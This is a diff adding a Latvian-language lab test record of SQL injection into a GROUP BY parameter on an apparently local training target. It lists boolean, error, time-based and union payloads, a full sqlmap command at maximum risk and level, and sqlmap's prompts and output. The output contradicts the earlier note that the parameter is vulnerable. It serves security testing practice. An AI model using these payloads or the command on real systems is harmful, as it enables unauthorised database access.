@@ -1,0 +1,19 @@
+=================================================================================
+1. Īpašība: tiek injicēts “GROUP BY” klauzulā
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?group=username having username like 'usxxx%25'
+3.2. error-based: ?group=username'
+3.3. time-based: ?group=username or sleep(1)
+3.4. union: ?group=username union select 1,2,3
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 120298173 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://192.168.17.134/sqlinjection/example6/?group=username" -p group --risk=3 --level=5
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameter 'group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+all tested parameters do not appear to be injectable. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanisms involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
